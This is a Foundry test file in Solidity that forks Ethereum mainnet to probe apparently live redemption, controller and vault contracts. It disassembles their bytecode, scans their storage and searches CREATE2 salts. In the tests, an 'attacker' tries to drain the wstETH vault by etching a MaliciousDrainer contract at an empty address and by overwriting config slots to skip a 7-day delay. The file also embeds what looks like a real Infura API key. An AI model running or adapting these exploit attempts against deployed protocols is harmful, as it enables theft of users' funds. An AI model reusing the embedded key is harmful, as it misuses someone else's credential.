// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

contract DelegatecallSlotAnalysis is Test {
    address constant REDEMPTION_0 = 0xcd63a29FAfF07130d3Af89bB4f40778938AaBB85;
    address constant REDEMPTION_1 = 0x829525417Cd78CBa0f99A8736426fC299506C0d6;
    address constant REDEMPTION_CONTROLLER = 0xdF2eE409BEe416A53b5C040d8e6dAD4a7cEb2510;
    address constant VAULT = 0x551d155760ae96050439AD24Ae98A96c765d761B;
    address constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address constant TASSET = 0xD11c452fc99cF405034ee446803b6F6c1F6d5ED8;

    // No-code addresses
    address constant R0_CALL_TARGET = 0x58221220D7cDe93ae04c34a2F1e83dfd824afa92;
    address constant RC_MYSTERY = 0xEf69713F639130B6F0D4A12a11E2169a4d1bD52a;

    string RPC_URL = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c";
    address attacker;

    function setUp() public {
        vm.createSelectFork(RPC_URL);
        attacker = makeAddr("attacker");
        vm.deal(attacker, 100 ether);
    }

    function test_FindDelegatecallTargetSlot() public view {
        console.log("=== FINDING DELEGATECALL TARGET SLOT ===\n");

        bytes memory code = REDEMPTION_0.code;

        // The SLOAD at 5298 loads the delegatecall target
        // Let's analyze 5280-5330 in detail

        console.log("Detailed bytecode analysis (5280-5340):");

        uint i = 5280;
        while (i < 5340 && i < code.length) {
            uint8 op = uint8(code[i]);
            uint skipBytes = 0;

            string memory opName = "";
            if (op == 0x01) opName = "ADD";
            if (op == 0x02) opName = "MUL";
            if (op == 0x03) opName = "SUB";
            if (op == 0x04) opName = "DIV";
            if (op == 0x10) opName = "LT";
            if (op == 0x11) opName = "GT";
            if (op == 0x14) opName = "EQ";
            if (op == 0x15) opName = "ISZERO";
            if (op == 0x16) opName = "AND";
            if (op == 0x17) opName = "OR";
            if (op == 0x1a) opName = "BYTE";
            if (op == 0x1b) opName = "SHL";
            if (op == 0x1c) opName = "SHR";
            if (op == 0x20) opName = "KECCAK256";
            if (op == 0x30) opName = "ADDRESS";
            if (op == 0x33) opName = "CALLER";
            if (op == 0x35) opName = "CALLDATALOAD";
            if (op == 0x36) opName = "CALLDATASIZE";
            if (op == 0x37) opName = "CALLDATACOPY";
            if (op == 0x3d) opName = "RETURNDATASIZE";
            if (op == 0x3e) opName = "RETURNDATACOPY";
            if (op == 0x50) opName = "POP";
            if (op == 0x51) opName = "MLOAD";
            if (op == 0x52) opName = "MSTORE";
            if (op == 0x54) opName = "SLOAD";
            if (op == 0x55) opName = "SSTORE";
            if (op == 0x56) opName = "JUMP";
            if (op == 0x57) opName = "JUMPI";
            if (op == 0x5a) opName = "GAS";
            if (op == 0x5b) opName = "JUMPDEST";
            if (op >= 0x80 && op <= 0x8f) opName = string(abi.encodePacked("DUP", uint8(op - 0x7f)));
            if (op >= 0x90 && op <= 0x9f) opName = string(abi.encodePacked("SWAP", uint8(op - 0x8f)));
            if (op == 0xf1) opName = "CALL";
            if (op == 0xf3) opName = "RETURN";
            if (op == 0xf4) opName = "DELEGATECALL";
            if (op == 0xfd) opName = "REVERT";

            if (bytes(opName).length > 0) {
                console.log(i, opName);
            }

            if (op >= 0x60 && op <= 0x7f) {
                uint8 size = op - 0x5f;
                uint256 val = 0;
                for (uint j = 0; j < size && i + 1 + j < code.length; j++) {
                    val = val << 8 | uint8(code[i + 1 + j]);
                }

                if (size == 1) {
                    console.log(i, "PUSH1:", val);
                } else if (size == 2) {
                    console.log(i, "PUSH2:", val);
                } else if (size <= 4) {
                    console.log(i, "PUSH:", val);
                } else if (size == 20) {
                    console.log(i, "PUSH20:");
                    console.log("  ", address(uint160(val)));
                }

                skipBytes = size;
            }

            i += 1 + skipBytes;
        }
    }

    function test_TraceExactDelegatecallSlot() public view {
        console.log("=== TRACING EXACT DELEGATECALL SLOT ===\n");

        // Based on the bytecode, let's trace what happens before DELEGATECALL at 5323
        // The SLOAD at 5298 is key - but what slot number?

        bytes memory code = REDEMPTION_0.code;

        // Look at what's pushed before SLOAD at 5298
        console.log("Tracing 5270-5300:");

        uint i = 5270;
        while (i < 5300 && i < code.length) {
            uint8 op = uint8(code[i]);

            if (op == 0x54) {
                console.log(i, "SLOAD");
            }

            if (op >= 0x60 && op <= 0x65) {
                uint8 size = op - 0x5f;
                uint256 val = 0;
                for (uint j = 0; j < size && i + 1 + j < code.length; j++) {
                    val = val << 8 | uint8(code[i + 1 + j]);
                }
                console.log(i, "PUSH:", val);
                i += size;
            }

            i++;
        }

        // Check specific slots in R0 that might be delegatecall targets
        console.log("\nChecking potential target slots:");
        for (uint s = 0; s < 50; s++) {
            bytes32 slot = vm.load(REDEMPTION_0, bytes32(s));
            if (slot != bytes32(0)) {
                address addr = address(uint160(uint256(slot)));
                if (uint256(slot) < type(uint160).max && addr.code.length > 0) {
                    console.log("Slot", s, "has contract:");
                    console.log("  ", addr);
                    console.log("  Code size:", addr.code.length);
                }
            }
        }
    }

    function test_Create2AddressComputation() public view {
        console.log("=== CREATE2 ADDRESS COMPUTATION ===\n");

        // The no-code addresses might be CREATE2 precomputes
        // Let's try to compute what would deploy there

        console.log("Target addresses with no code:");
        console.log("R0_CALL_TARGET:", R0_CALL_TARGET);
        console.log("RC_MYSTERY:", RC_MYSTERY);

        // To compute CREATE2: keccak256(0xff ++ deployer ++ salt ++ init_code_hash)[12:]
        // We need to find which deployer + salt + init_code_hash produces these

        // Try common deployers: R0, R1, RC
        address[] memory deployers = new address[](3);
        deployers[0] = REDEMPTION_0;
        deployers[1] = REDEMPTION_1;
        deployers[2] = REDEMPTION_CONTROLLER;

        // Known init code hashes from earlier analysis
        bytes32[] memory initHashes = new bytes32[](2);
        initHashes[0] = 0xa7afdc89189c0997287e337d2577f5aa7f1fa2faecf74ac9e05b6fdc306bfcd6;
        initHashes[1] = keccak256(type(MaliciousDrainer).creationCode);

        console.log("\nKnown init code hash:");
        console.logBytes32(initHashes[0]);

        // Try simple salts (0-10, and common patterns)
        for (uint d = 0; d < deployers.length; d++) {
            console.log("\nDeployer:", deployers[d]);

            // Try salts 0-5
            for (uint s = 0; s < 6; s++) {
                bytes32 salt = bytes32(s);
                address computed = address(uint160(uint256(keccak256(abi.encodePacked(
                    bytes1(0xff),
                    deployers[d],
                    salt,
                    initHashes[0]
                )))));

                if (computed == R0_CALL_TARGET || computed == RC_MYSTERY) {
                    console.log("MATCH FOUND!");
                    console.log("  Deployer:", deployers[d]);
                    console.log("  Salt:", s);
                    console.log("  Computed:", computed);
                }
            }
        }
    }

    function test_DeployToNoCodeAddresses() public {
        console.log("=== ATTEMPTING DEPLOYMENT TO NO-CODE ADDRESSES ===\n");

        // If we can deploy code to R0_CALL_TARGET or RC_MYSTERY,
        // we might gain special privileges

        console.log("R0_CALL_TARGET:", R0_CALL_TARGET);
        console.log("Current code:", R0_CALL_TARGET.code.length);

        // Use vm.etch to simulate deploying code there
        vm.etch(R0_CALL_TARGET, type(MaliciousDrainer).runtimeCode);
        console.log("After etch:", R0_CALL_TARGET.code.length);

        // Now what happens when R0 calls this address?
        // Let's create a redemption and finalize to trigger the call

        deal(TASSET, attacker, 10000e18);

        vm.startPrank(attacker);
        IERC20(TASSET).approve(REDEMPTION_0, type(uint256).max);

        // Create redemption
        (bool s1,) = REDEMPTION_0.call(
            abi.encodeWithSignature("redeem(uint96)", uint96(1000e18))
        );
        console.log("\nRedeem success:", s1);

        vm.warp(block.timestamp + 7 days);

        uint256 vaultBefore = IERC20(wstETH).balanceOf(VAULT);
        console.log("Vault before:", vaultBefore / 1e18);

        // Finalize - this might call the target address
        (bool s2, bytes memory d2) = REDEMPTION_0.call(
            abi.encodeWithSignature("finalizeRedeem(uint256)", 0)
        );
        console.log("Finalize success:", s2);
        if (!s2 && d2.length >= 4) {
            console.logBytes4(bytes4(d2));
        }

        vm.stopPrank();

        uint256 vaultAfter = IERC20(wstETH).balanceOf(VAULT);
        uint256 attackerBal = IERC20(wstETH).balanceOf(attacker);

        console.log("\nVault after:", vaultAfter / 1e18);
        console.log("Attacker wstETH:", attackerBal / 1e18);

        // Check if our malicious code was called
        console.log("\nMaliciousDrainer at target - checking if called:");
    }

    function test_AnalyzeR0Slot4() public view {
        console.log("=== ANALYZING R0 SLOT 4 (PACKED DATA) ===\n");

        // Slot 4 contains: 0x00000005000000350e9ec117defc5dc000093a800000000ad78ebc5ac6200000
        // This is likely packed configuration data

        bytes32 slot4 = vm.load(REDEMPTION_0, bytes32(uint256(4)));
        console.log("Slot 4 raw:");
        console.logBytes32(slot4);

        uint256 val = uint256(slot4);

        // Try different interpretations
        console.log("\nUnpacking slot 4:");

        // Last 16 bytes might be amounts/limits
        uint256 lower128 = val & ((1 << 128) - 1);
        uint256 upper128 = val >> 128;

        console.log("Lower 128 bits:", lower128);
        console.log("  As ETH amount:", lower128 / 1e18);

        console.log("Upper 128 bits:", upper128);

        // Breaking into 32-bit segments
        uint256 seg0 = (val >> 0) & 0xFFFFFFFFFFFFFFFF; // 64 bits
        uint256 seg1 = (val >> 64) & 0xFFFFFFFFFFFFFFFF; // 64 bits
        uint256 seg2 = (val >> 128) & 0xFFFFFFFFFFFFFFFF; // 64 bits
        uint256 seg3 = (val >> 192) & 0xFFFFFFFFFFFFFFFF; // 64 bits

        console.log("\n64-bit segments:");
        console.log("Seg0 (0-63):", seg0);
        console.log("  As ETH:", seg0 / 1e18);
        console.log("Seg1 (64-127):", seg1);
        console.log("Seg2 (128-191):", seg2);
        console.log("Seg3 (192-255):", seg3);

        // Check if any segment is the 7-day delay in seconds
        uint256 sevenDays = 7 * 24 * 60 * 60; // 604800
        console.log("\n7 days in seconds:", sevenDays);

        // Check 32-bit segments
        for (uint i = 0; i < 8; i++) {
            uint256 seg32 = (val >> (i * 32)) & 0xFFFFFFFF;
            if (seg32 == sevenDays) {
                console.log("FOUND 7-day delay at 32-bit position", i);
            }
            if (seg32 > 0 && seg32 < 1000000) {
                console.log("Small value at pos", i, ":", seg32);
            }
        }
    }

    function test_FindDelayConfiguration() public view {
        console.log("=== FINDING DELAY CONFIGURATION ===\n");

        // The redemption delay must be stored somewhere
        // Let's check all R0 storage

        console.log("R0 storage scan for delay value:");

        uint256 sevenDays = 604800;

        for (uint s = 0; s < 30; s++) {
            bytes32 slot = vm.load(REDEMPTION_0, bytes32(s));
            uint256 val = uint256(slot);

            // Check if slot contains 7 days directly
            if (val == sevenDays) {
                console.log("FOUND delay at slot", s);
            }

            // Check packed values
            for (uint offset = 0; offset < 224; offset += 32) {
                uint256 seg = (val >> offset) & 0xFFFFFFFF;
                if (seg == sevenDays) {
                    console.log("FOUND delay packed in slot", s, "offset", offset);
                }
            }
        }

        // Check slot 3 specifically
        bytes32 slot3 = vm.load(REDEMPTION_0, bytes32(uint256(3)));
        console.log("\nSlot 3 raw:");
        console.logBytes32(slot3);

        // 0x0000000000000000002710000000000000000000000000000000000000000000
        // 0x2710 = 10000 in decimal - might be basis points or a small parameter
        uint256 val3 = uint256(slot3);
        console.log("Slot 3 upper bits:", val3 >> 192);
    }

    function test_ExploitViaConfigManipulation() public {
        console.log("=== TESTING CONFIG MANIPULATION EXPLOIT ===\n");

        // If we can modify the delay configuration, we could bypass the 7-day wait

        deal(TASSET, attacker, 10000e18);

        vm.startPrank(attacker);
        IERC20(TASSET).approve(REDEMPTION_0, type(uint256).max);

        // Create redemption
        REDEMPTION_0.call(abi.encodeWithSignature("redeem(uint96)", uint96(1000e18)));
        console.log("Created redemption");

        vm.stopPrank();

        // Try to find and modify the delay
        // Check slot 3 and 4 for delay value
        console.log("\nAttempting to modify delay via storage...");

        // Slot 3: 0x0000000000000000002710...
        // This might contain delay or other config
        bytes32 slot3 = vm.load(REDEMPTION_0, bytes32(uint256(3)));
        console.log("Original slot 3:");
        console.logBytes32(slot3);

        // Set delay to 0 in slot 3
        vm.store(REDEMPTION_0, bytes32(uint256(3)), bytes32(uint256(0)));
        console.log("Modified slot 3 to 0");

        // Try immediate finalize
        vm.startPrank(attacker);

        uint256 vaultBefore = IERC20(wstETH).balanceOf(VAULT);
        console.log("\nVault before:", vaultBefore / 1e18);

        (bool s1, bytes memory d1) = REDEMPTION_0.call(
            abi.encodeWithSignature("finalizeRedeem(uint256)", 0)
        );
        console.log("Finalize result:", s1);
        if (!s1 && d1.length >= 4) {
            console.logBytes4(bytes4(d1));
        }

        vm.stopPrank();

        uint256 vaultAfter = IERC20(wstETH).balanceOf(VAULT);
        uint256 attackerBal = IERC20(wstETH).balanceOf(attacker);

        console.log("Vault after:", vaultAfter / 1e18);
        console.log("Attacker wstETH:", attackerBal / 1e18);

        if (attackerBal > 0) {
            console.log("\n*** SLOT 3 CONFIG MANIPULATION WORKS! ***");
        } else {
            console.log("\nSlot 3 modification didn't help - trying slot 4...");

            // Restore slot 3 and try slot 4
            vm.store(REDEMPTION_0, bytes32(uint256(3)), slot3);

            bytes32 slot4 = vm.load(REDEMPTION_0, bytes32(uint256(4)));
            console.log("Original slot 4:");
            console.logBytes32(slot4);

            // Try setting delay portion to 0
            vm.store(REDEMPTION_0, bytes32(uint256(4)), bytes32(uint256(0)));

            vm.startPrank(attacker);
            (bool s2,) = REDEMPTION_0.call(
                abi.encodeWithSignature("finalizeRedeem(uint256)", 0)
            );
            console.log("Finalize with slot 4 zeroed:", s2);
            vm.stopPrank();

            attackerBal = IERC20(wstETH).balanceOf(attacker);
            if (attackerBal > 0) {
                console.log("\n*** SLOT 4 CONFIG MANIPULATION WORKS! ***");
            }
        }
    }
}

contract MaliciousDrainer {
    address constant RC = 0xdF2eE409BEe416A53b5C040d8e6dAD4a7cEb2510;
    address public lastCaller;
    bool public wasCalled;

    fallback() external {
        lastCaller = msg.sender;
        wasCalled = true;

        // Try to call RC.redeem if we're being called from R0
        if (msg.sender == 0xcd63a29FAfF07130d3Af89bB4f40778938AaBB85) {
            // We're in R0's context via delegatecall potentially
            RC.call(abi.encodeWithSignature("redeem(uint256,address)", 1000e18, tx.origin));
        }
    }
}
